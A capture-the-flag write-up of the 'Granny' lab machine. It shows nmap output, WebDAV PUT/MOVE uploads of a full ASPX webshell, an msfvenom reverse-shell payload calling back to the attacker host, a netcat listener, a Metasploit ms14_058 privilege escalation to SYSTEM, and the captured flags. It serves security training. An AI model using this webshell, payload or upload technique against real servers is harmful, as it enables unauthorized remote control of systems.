# Granny

## Information Gathering
10.10.10.15

## Enumeration and Scanning
Scanning the only given host:<br>
```bash
# Nmap 7.92 scan initiated Mon Jan  3 23:49:56 2022 as: nmap -sC -sV -oN nmap/granny.nmap 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.030s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Tue, 04 Jan 2022 05:04:55 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  3 23:50:08 2022 -- 1 IP address (1 host up) scanned in 12.15 seconds
```
When configuring a web server you really only ever want the GET and POST HTTP methods. Anything else is considered unecessary unless you REALLY need it.<br>
The HTTP method PUT allows for arbitrary file upload. I am potentially able to upload a reverse shell/web shell. Because this is a Microsoft IIS httpd 6.0 WebServer it is most likely that ASPX will be the file format I will use to gain remote code execution.<br>
I use <a href="https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx">this</a> web shell. I also use BurpSuite to create my custom HTTP header.
```bash
PUT /shell.aspx HTTP/1.1
Host: 10.10.10.15
Content-Length: 15968

[ASPX_SCRIPT_HERE]
```
This returns a 403 - Forbidden error code because I am not allowed to upload executable files directly. Fortunately, there is another HTTP header verb that can be used. MOVE allows for the renaming of files hosted on webserver. Uploading "shell.aspx" as "shell.txt" and then using MOVE to rename the file to the proper extension yields a reverse shell.<br>
Start the listener:<br>
```bash
nc -lnvp 8888
```
PUT the file:<br>
```bash
PUT /shell.txt HTTP/1.1
Host: 10.10.10.15
Content-Length: 15968

[ASPX_SCRIPT_HERE]
```
MOVE the file:<br>
```bash
MOVE /shell.txt HTTP/1.1
Host: 10.10.10.15
Destination: http://10.10.10.15/shell.aspx
```
And a reverse shell is caught!<br>
```bash
connect to [10.10.14.122] from (UNKNOWN) [10.10.10.15] 1031
Spawn Shell...
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

For the WebShell<br>

There is a webshell in Kali at /usr/share/webshells/aspx/cmdasp.aspx
```aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
```
Using CLI we can upload this shell<br>
```bash
curl -X PUT http://10.10.10.15/cmdasp.txt -d @cmdasp.aspx
curl -X MOVE http://10.10.10.15/cmdasp.txt -H 'Destination: http://10.10.10.15/cmdasp.aspx'
```
When navigating to /cmdasp.aspx there is a webshell.<br>
Now I can generate a payload using msfvenom<br>
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.122 LPORT=9999 -f aspx > ex.aspx
```
And perform the same actions to upload the file.<br>
```bash
curl -X PUT http://10.10.10.15/ex.txt --data-binary @ex.aspx
curl -X MOVE http://10.10.10.15/ex.text -H "Destination: http://10.10.10.15/ex.aspx"
```
Boot up Metasploit and start a shell. Set options accordingly:<br>
```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp

[OPTION_STUFF]

meterpreter > 
```


## Privilege Escalation
Because I am using Metasploit, I can let it run a scanner for me.<br>
```bash
meterpreter > background
msf6 > search local_exploit
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 29 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
There are a lot of options. I went with ms14_058. So load up the payload, fill out the options, and execute the payload.<br>
```bash
msf6 > use exploit/windows/local/ms14_058_track_popup_menu
msf6 > run 

[*] Started reverse TCP handler on 10.10.14.122:4444 
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 1348 launched.
[*] Reflectively injecting the DLL into 1348...
[*] Sending stage (175174 bytes) to 10.10.10.15
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 4 opened (10.10.14.122:4444 -> 10.10.10.15:1042 ) at 2022-01-04 14:54:00 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The flags are captured below:
```
User Flag: 700c5dc163014e22b3e408f8703f67d1
Root Flag: aa4beed1c0584445ab463a6747bd06e9
```